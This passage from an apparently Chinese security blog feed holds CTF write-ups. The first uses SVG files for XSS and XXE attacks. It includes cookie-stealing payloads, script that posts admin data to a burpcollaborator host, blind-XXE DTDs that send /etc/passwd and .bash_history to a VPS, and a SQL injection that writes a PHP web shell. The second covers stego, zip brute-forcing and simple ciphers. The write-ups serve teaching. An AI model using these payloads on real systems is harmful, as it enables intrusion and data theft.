+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;vps-ip:1234&#39;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212749933.png" alt="image-20201102212749933"></p>
+<p>vps成功接收到信息</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102212656829.png" alt="image-20201102212656829"></p>
+<p>然后再获取cookie即可</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;vps-ip:1234&#x2F;?&#39;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Teaser Confidence CTF 2019：Web 50</p>
+<p>本题是一道比较经典的利用svg去构造xss的题目，但是由于题目并没有开源，所以没办法复现，这里主要学习他的思路。</p>
+<p>根据题目描述，有两个功能，一个是报告BUG，一个是修改个人信息，然后管理员会查看该域名下的某处页面，这里主要是通过xss获取admin页面Secret表单的值来获取flag。</p>
+<p>在个人资料页面中，我们可以将头像上传到服务器，服务器将检查此文件是否为有效图像，并且大小必须为100x100。我们如果将有效的PNG图片重命名为1.html，然后上传。但是，HTTP内容类型仍为<code>image/png</code>，那么这里有个问题就是如果内容类型为<code>image/png</code>，则将此链接发送给admin不会触发XSS有效负载。</p>
+<p>所以这里就可以使用svg作为媒介来构造xss，去获取secret的值，这里直接贴一下payload</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; id=&quot;Layer_1&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;-12.5 -12.5 100 100&quot; xml:space=&quot;preserve&quot;&gt; </span><br><span class="line">  ...</span><br><span class="line">  &lt;g&gt;</span><br><span class="line">    &lt;polygon fill=&quot;#00B0D9&quot; points=&quot;41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 &quot;&gt;&lt;/polygon&gt;</span><br><span class="line">    &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onreadystatechange = function() &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">          var xhr2 = new XMLHttpRequest();</span><br><span class="line">          xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://XXXX.burpcollaborator.net/&quot;</span>);</span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line">      xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://web50.zajebistyc.tf/profile/admin&quot;</span>);</span><br><span class="line">      xhr.withCredentials = true;</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/g&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了burpcollaborator来外带数据，Burp Suite在1.7之后的版本自带了这个功能，获取burpcollaborator的地址如图所示：</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102171516321.png" alt="image-20201102171516321"></p>
+<p>最后在Reportbug处提交图片即可获得flag，这里借用一下郁离歌师傅的图。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201102170955296.png" alt="image-20201102170955296"></p>
+<h2 id="SVG造成XXE"><a href="#SVG造成XXE" class="headerlink" title="SVG造成XXE"></a>SVG造成XXE</h2><p>前面说了SVG是基于XML的矢量图，因此可以支持Entity(实体)功能，因此可以用来XXE。</p>
+<h3 id="CTF中的应用场景-1"><a href="#CTF中的应用场景-1" class="headerlink" title="CTF中的应用场景"></a>CTF中的应用场景</h3><p>这里从两道经典的CTF题目来学习如何XXE并且结合SVG，这里分为有回显和无回显两种情况。</p>
+<h4 id="有回显的情况"><a href="#有回显的情况" class="headerlink" title="有回显的情况"></a>有回显的情况</h4><p>svgmagic(BsidesSF CTF 2019)</p>
+<p>github题目源码：<a href="https://github.com/BSidesSF/ctf-2019-release/tree/master/challenges/svgmagic">传送门</a></p>
+<p>buu平台也有上这道题目</p>
+<p>打开页面</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031171541673.png" alt="image-20201031171541673"></p>
+<p>打开页面就提示Convert SVG to PNG with Magic</p>
+<p>这里我们首先想到的思路就是文件上传那些步骤，一句话木马以及<code>.htaccess</code>等等，但是多次上传利用无果，因为会报一个500的错误，这里的话可以利用SVG配合XXE去读取他的一个文件。</p>
+<p>我们直接读取<code>/etc/passwd</code>试一下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们把上面这段代码保存为1.svg，并上传。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031173350983.png" alt="image-20201031173350983"></p>
+<p>可以发现成功回显了带有<code>/etc/passwd</code>内容的图片，但是图像太小，无法容纳所有内容，这里我们可以调整他的width宽度，调大一点就可以看到所有的内容了。</p>
+<p>还有个问题就是我们并不知道flag的路径，而/proc/self/pwd/代表的是当前路径，可以构造/proc/self/pwd/flag.txt读取文件。</p>
+<p>最后payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们保存为2.svg上传，发现成功读取到flag。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031174136650.png" alt="image-20201031174136650"></p>
+<h4 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h4><p>在说这个点之前，我们先来看看普通XXE无回显是如何外带数据的，这里我在本地演示一下：</p>
+<p>先在本地PHPStudy写入无回显处理XML的代码</p>
+<p>xml.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在自己的VPS上放置</p>
+<p>xml.dtd</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;WINDOWS&#x2F;win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:1234&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里有几个需要注意的点：</p>
+<p>ip换成自己的vps的ip</p>
+<p>这里的<code>&amp;#x25;</code>会被xml解析成<code>%</code>，如果直接用<code>%</code>的话我本地会报错。</p>
+<p>注意这里使用伪协议读取文件内容，是因为xml解析器支持使用<code>php://filter</code>进行编码，至于为什么要使用伪协议对内容进行一个编码呢，我自己在本地做测试的时候，发现如果文件的内容如果只是简单的字母数字不加伪协议也可以，但是一旦带有换行或者特殊的符号就会爆一个<code>warning invaild url</code>，所以保险起见还是加上，最后对文件内容做一个base64的解码就行。</p>
+<p>最后我们POST提交的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Note [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;xml.dtd&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %start;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的ip同样换成自己的vps的ip</p>
+<p>下一步在VPS上开启监听1234端口</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>然后我们抓xml.php的POST包并发送payload</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130640113.png" alt="image-20201031130640113"></p>
+<p>可以看到在vps上成功接收到了我本地<code>C:/WINDOWS/win.ini</code>这个文件的内容。</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201031130513819.png" alt="image-20201031130513819"></p>
+<p>我们来梳理一下他的整个调用过程</p>
+<ol>
+<li>首先我们payload中的<code>% remote</code>去获取vps上的xml.dtd</li>
+<li>然后xml.dtd中的<code>% start</code>去调用<code>% file</code></li>
+<li><code>% file</code>获取服务器上的<code>C:/WINDOWS/win.ini</code>文件并将他base64编码</li>
+<li>最后通过<code>% send</code>将数据发送到vps监听的1234端口上</li>
+</ol>
+<p>这就是XXE实现外带数据的整个流程，那么这个如何结合SVG呢，这里通过一道我之前打比赛的一道题为例子：</p>
+<p>svgggggg!(DozerCTF2020)</p>
+<p>这道题当时比赛的时候没有做出来，因为当时水平有限，并没有想到svg也是xml格式，可以用来XXE，这道题确实质量可以，学到了很多新的姿势，下面给出我复现的过程。</p>
+<p>题目给的两个hint：</p>
+<ul>
+<li>用户r1ck的操作记录在哪儿来着</li>
+<li>如果你发现了sql注入，直接getshell吧，flag在/app目录里</li>
+</ul>
+<p>复现过程如下：</p>
+<p>打开网页，有一个框要求输入URL，然后检查URL指向的file是不是svg图片，如果请求的文件不是svg的话就会返回Unauthorized type!</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201027231920483.png" alt="image-20201027231920483"></p>
+<p>我们先写一个简单的SVG图片源码放在vps上，保存为1.svg</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-string">&quot;HELLO&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交SVG图片源码地址发现实体成功显示，然后我们尝试读取一下用户的history文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;files;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面虽然正常返回信息，但是并不能直接读到我们想要的东西，但是无回显，所以这里就可以利用到盲XXE来外带数据了，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。</p>
+<p>构造1.svg</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">lab</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://39.105.158.221:1234/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;lab;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造xml.dtd</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:1234&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们把1.svg和xml.dtd放到我们的vps上，然后在我们的vps上监听1234端口，再在网页提交1.svg的链接即可成功读取到.bash_history，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;app</span><br><span class="line">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure>
+
+<p>可以得知在8080端口有另外一个web服务，我们继续利用XXE数据外带读取源码，修改1.svg的一部分内容如下，其余操作一样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;index.php&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取到源码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">Hi!</span><br><span class="line">You Find Me .</span><br><span class="line">Flag is nearby.</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$conn=mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    $id = <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">&quot;select * from user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysql_query($sql,$conn);</span><br><span class="line">$arr = mysql_fetch_assoc($result);</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现sql注入，没有任何的过滤，直接利用into outfile写个一句话木马，当然这里要注意的是传入的时候要url编码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?id&#x3D;-1&#39; union select 1,&#39;&lt;?php system($_GET[cmd]);&gt;&#39; into outfile&#39;&#x2F;app&#x2F;dashabi.php&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>写完shell之后，继续利用数据外带读取内容，重复上面的步骤即可。</p>
+<p>读取文件目录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;dashabi.php?cmd&#x3D;ls&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取flag：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;dashabi.php?cmd&#x3D;cat%20H3re_1s_y0ur_f14g.php&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SVG算是一个比较容易让人忽视的点，但是他造成的一些问题却是我们不能够忽视的，在CTF中如果有些题目没有限制SVG这个点的话，我们就可以尝试用他来进行XSS或者XXE，然后在查阅资料的过程，发现在国外有人总结了SVG的攻击XSS的一些payload以及防御的方案，具体可以参考：</p>
+<p><a href="https://svg.digi.ninja/">https://svg.digi.ninja/</a></p>
+<p><a href="https://github.com/digininja/svg_xss">https://github.com/digininja/svg_xss</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://yulige.top/?p=665">http://yulige.top/?p=665</a></p>
+<p><a href="https://www.rootnetsec.com/bsidessf-svgmagick/">https://www.rootnetsec.com/bsidessf-svgmagick/</a></p>
+<p><a href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>海啸杯writeup</title>
+    <url>/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AF/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记一次校内的比赛<a id="more"></a></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>PNG高度隐藏</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119115739801.png" alt="image-20201119115739801"></p>
+<h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>基于 LSB 原理图片隐写</p>
+<p>使用 Stegsolve 的 Data Extract 分析，下载地址：<a href="https://share.weiyun.com/z9PBJjks">https://share.weiyun.com/z9PBJjks</a></p>
+<p>加载图片，并 Data Extract 分析</p>
+<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-YQrNMwiLAMKiXyXK.png"></p>
+<p>这里就分析出来一个 png 的文件。点击下方 save bin 保存为 png 文件即可。</p>
+<p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-08-09-qV653B9sifbnxjyQ.png"></p>
+<p>扫描二维码即可获得flag。</p>
+<h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>直接丢kali，binwalk分离</p>
+<p>最后得到一个倒过来的flag，将其颠倒得到正确的flag</p>
+<h3 id="你能破解吗"><a href="#你能破解吗" class="headerlink" title="你能破解吗"></a>你能破解吗</h3><ul>
+<li>hint：压缩包密码为g2mtu加四位数字</li>
+</ul>
+<p>这里可以使用ARCHPR压缩包破解软件</p>
+<p>首先用遍历所有的密码，然后保存在1.txt字典里面</p>
+<p>遍历脚本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&#39;1.txt&#39;,&#39;w&#39;)</span><br><span class="line">for i in range(1000,9999):</span><br><span class="line">	a &#x3D; &#39;g2mtu&#39;+str(i)+&#39;\n&#39;</span><br><span class="line">	f.write(a)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后打开软件选择字典模式</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120006028.png" alt="image-20201119120006028"></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120028376.png" alt="image-20201119120028376"></p>
+<p>解开压缩包再base64解密即可获得flag。</p>
+<h3 id="disk0"><a href="#disk0" class="headerlink" title="disk0"></a>disk0</h3><p>挂载命令如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount disk0 存放的文件夹</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120750180.png" alt="image-20201119120750180"></p>
+<p>一个文本文件，和一个加密过的zip，文本说密码被删除了，使用取证工具<strong>extundelete</strong>恢复一下disk0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete disk0 --restore-all</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yuhaojiang.gitee.io/picture/%E6%B5%B7%E5%95%B8%E6%9D%AF/image-20201119120947921.png" alt="image-20201119120947921"></p>
+<p>得到一个RECOVERED_FILES文件夹，里面file文件就是zip的密码</p>
+<p>解压再修改一下图片高度即可得到flag</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="凯撒将军"><a href="#凯撒将军" class="headerlink" title="凯撒将军"></a>凯撒将军</h3><p>凯撒密码</p>
+<p>加密算法：将给定的flag中的每个字符后移3位，并将偏移后的字符串base64编码</p>
+<p>加密脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;flag&#123;crypto_is_hxb_so_eAsy0&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">result = flag.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br><span class="line">encode_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    encode_flag += chr((ord(i)+<span class="number">3</span>)%<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> encode_flag</span><br></pre></td></tr></table></figure>
+
+<p>解密脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result=<span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag.decode(<span class="string">&quot;base64&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>栅栏密码</p>
+<p>由于栅栏数较小，因此不给出栅栏数提示，可以用网上的栅栏密码解密或手写脚本爆破栅栏数解密</p>
+<p>加密脚本:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag &#x3D; &quot;flag&#123;yo_uget_itzha_lan_good&#125;&quot;</span><br><span class="line"></span><br><span class="line">#flag&#123;yo _uget_i tzha_la n_good&#125;</span><br><span class="line"></span><br><span class="line">k &#x3D; 7 </span><br><span class="line"></span><br><span class="line">flag &#123;yo_ uget _itz ha_l an_g ood&#125;</span><br><span class="line"></span><br><span class="line">f_tn</span><br><span class="line"></span><br><span class="line">encode_flag&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    for j in range(4):</span><br><span class="line">        encode_flag +&#x3D; flag[j*7+i]</span><br><span class="line"></span><br><span class="line">print encode_flag</span><br></pre></td></tr></table></figure>
+
+<p>​    解密脚本:</p>
